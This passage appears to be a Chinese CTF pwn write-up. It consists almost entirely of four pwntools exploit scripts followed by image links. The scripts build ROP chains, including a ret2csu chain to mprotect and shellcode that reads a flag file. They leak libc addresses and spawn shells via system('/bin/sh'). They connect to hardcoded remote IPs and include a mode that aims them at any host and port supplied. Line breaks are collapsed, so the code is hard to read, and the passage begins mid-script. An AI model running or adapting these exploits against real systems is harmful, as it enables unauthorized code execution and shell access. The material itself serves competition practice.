pay += p64(rcx)pay += p64(2)pay += p64(r10)pay += p64(rdi)pay += p64(0x1000)pay += p64(rsi)pay += p64(0x50)pay += p64(rdx)pay += p64(7) * 2pay += p64(r8)pay += p64(3)pay += p64(rax)pay += p64(9)pay += p64(r13)pay += p64(libc.sym['read']+74) // syscal， add rsp 然后会调整stackpay += p64(r9)pay += p64(0) * 4
pay += p64(rdi)pay += p64(1)pay += p64(rsi)pay += p64(0x10000)pay += p64(rdx)pay += p64(0x50) * 2pay += p64(libc.sym['write'])

#gdb.attach(io,gdbscript)sl(pay)#
io.interactive()
```



```
from pwn import *
s = lambda data :io.send(data)sa = lambda delim,data :io.sendafter(str(delim), data)sl = lambda data :io.sendline(data)sla = lambda delim,data :io.sendlineafter(str(delim), data)r = lambda num :io.recv(num)rl = lambda :io.recvline()ru = lambda delims, drop=True :io.recvuntil(delims, drop)itr = lambda :io.interactive()uu32 = lambda data :u32(data.ljust(4,b'x00'))uu64 = lambda data :u64(data.ljust(8,b'x00'))ls = lambda data :log.success(data)lss = lambda s :log.success(' 33[1;31;40m%s --> 0x%x  33[0m' % (s, eval(s)))
context.arch = 'amd64'context.log_level = 'debug'context.terminal = ['tmux','splitw','-h','-l','130']def start(binary,argv=[], *a, **kw): '''Start the exploit against the target.''' if args.GDB: return gdb.debug([binary] + argv, gdbscript=gdbscript, *a, **kw) elif args.RE: #return remote('8.147.128.163', 34043) return remote('8.147.128.54',26858) else: return process([binary] + argv, *a, **kw)

binary = './pwn'libelf = ''
if (binary!=''): elf = ELF(binary) ; rop=ROP(binary);libc = elf.libcif (libelf!=''): libc = ELF(libelf)
gdbscript = '''#continueb *0x401286'''.format(**locals())
io = start(binary)

#gdb.attach(io,gdbscript)

pay = b'A' *0x50 +p64(0x404000+0x800)+ p64(0x401269)s(pay)
pause()
read_plt = elf.plt['read']read_got = elf.got['read']rdi = 0x00000000004013d3 # pop rdi ; retrsi = 0x00000000004013d1 # pop rsi ; pop r15 ; ret
magic = 0x00000000004011fc # add dword ptr [rbp - 0x3d], ebx ; nop ; retbss = 0x404000
csu1 = 0x4013CAcsu2 = 0x4013B0

libc = elf.libcmprotect = libc.sym['mprotect']_IO_2_1_stdout_ = libc.sym['_IO_2_1_stdout_']offset = 0x10000000000000000 - (_IO_2_1_stdout_ - mprotect)target = _IO_2_1_stdout_ + 0x3d
pay = b'A' * 0x28pay += p64(0x4013CA)pay += p64(offset)pay += p64(0x0404070+0x3d)pay += p64(0) * 4pay += p64(magic)
pay += p64(csu1)pay += p64(0) # rbxpay += p64(1) # rbppay += p64(bss) # rdipay += p64(0x1000) # rsipay += p64(0x7) # rdxpay += p64(0x0404070) # mprotectpay += p64(csu2)pay += p64(0x42) * 7pay += p64(0x4048c8) # leave retpay += b'x90' * 0x10pay += asm(shellcraft.open('flag'))pay += asm(shellcraft.sendfile(1,'rax',0,0x50))
sl(pay)
io.interactive()
```



```
from pwn import *import syss = lambda data :io.send(data)sa = lambda delim,data :io.sendafter(str(delim), data)sl = lambda data :io.sendline(data)sla = lambda delim,data :io.sendlineafter(str(delim), data)r = lambda num :io.recv(num)ru = lambda delims, drop=True :io.recvuntil(delims, drop)rl = lambda :io.recvline()itr = lambda :io.interactive()uu32 = lambda data :u32(data.ljust(4,b'x00'))uu64 = lambda data :u64(data.ljust(8,b'x00'))ls = lambda data :log.success(data)lss = lambda s :log.success(' 33[1;31;40m%s --> 0x%x  33[0m' % (s, eval(s)))
context.arch = 'amd64'context.log_level = 'debug'context.terminal = ['tmux','splitw','-h','-l','130']def start(binary,argv=[], *a, **kw): '''Start the exploit against the target.''' if args.GDB: return gdb.debug([binary] + argv, gdbscript=gdbscript, *a, **kw) elif args.RE: return remote('39.106.48.123',43273) elif args.AWD: # python3 exp.py AWD 1.1.1.1 PORT IP = str(sys.argv[1]) PORT = int(sys.argv[2]) return remote(IP,PORT) else: return process([binary] + argv, *a, **kw)

binary = './pwn'libelf = ''
if (binary!=''): elf = ELF(binary) ; rop=ROP(binary);libc = elf.libcif (libelf!=''): libc = ELF(libelf)
gdbscript = '''brva 0x001CD9#continue'''.format(**locals())
io = start(binary)

ru(':')sl('2')ru('you')pay = cyclic(0x400)pay = fit({ 0:0xa, 8:0xC, 0x10:-1022, }) + b'////bin/shx00';sl(pay)#gdb.attach(io,gdbscript)sl('3')
itr()
```



```
from pwn import *import syss = lambda data :io.send(data)sa = lambda delim,data :io.sendafter(str(delim), data)sl = lambda data :io.sendline(data)sla = lambda delim,data :io.sendlineafter(str(delim), data)r = lambda num :io.recv(num)ru = lambda delims, drop=True :io.recvuntil(delims, drop)rl = lambda :io.recvline()itr = lambda :io.interactive()uu32 = lambda data :u32(data.ljust(4,b'x00'))uu64 = lambda data :u64(data.ljust(8,b'x00'))ls = lambda data :log.success(data)lss = lambda s :log.success(' 33[1;31;40m%s --> 0x%x  33[0m' % (s, eval(s)))
context.arch = 'amd64'context.log_level = 'debug'context.terminal = ['tmux','splitw','-h','-l','130']def start(binary,argv=[], *a, **kw): '''Start the exploit against the target.''' if args.GDB: return gdb.debug([binary] + argv, gdbscript=gdbscript, *a, **kw) elif args.RE: return remote('8.147.128.22', 25823) elif args.AWD: # python3 exp.py AWD 1.1.1.1 PORT IP = str(sys.argv[1]) PORT = int(sys.argv[2]) return remote(IP,PORT) else: return process([binary] + argv, *a, **kw)

binary = './main'libelf = ''
if (binary!=''): elf = ELF(binary) ; rop=ROP(binary);libc = elf.libcif (libelf!=''): libc = ELF(libelf)
gdbscript = '''brva 0x1600brva 0x0014CBbrva 0x00014FA#continue'''.format(**locals())
io = start(binary)

def up(name,pwd): ru(': ') sl('1') ru('username: ') s(name) ru(': ') s(pwd)
def login(name,pwd): ru(': ') sl('2') ru('username: ') s(name) ru(': ') s(pwd)
def add(l): ru('> ') sl('3') ru(': ') sl(str(l))

up('A'*0x24,'P'*0x24)
#gdb.attach(io,gdbscript)login('root'.ljust(0x24,'x00'),'this is passwordx01'.ljust(0x24,'xAA'))

ru(': ')sl('3')ru(': ')sl(str(0x38))pause()s('A'*0x38)
ru('A'*0x38)libc_base = uu64(r(6)) - 276052

system = libc_base + libc.sym['system']rdi = libc_base + next(libc.search(asm('pop rdi;ret')))bin_sh = libc_base + next(libc.search(b'/bin/sh'))
lss('libc_base')
ru('[')sl('y')
ru(': ')sl('3')ru(': ')sl('-3')
pause()pay = b'A' * 0x68pay += p64(rdi+1) + p64(rdi) + p64(bin_sh) + p64(system)sl(pay)ru('[')sl('y')#itr()
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/07/5-1721006356.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/07/4-1721006358.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/07/1-1721006360.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/07/5-1721006361.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/07/10-1721006361.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/07/5-1721006362.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/07/4-1721006363.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/07/7-1721006363.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/07/5-1721006364.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/07/0-1721006366.png)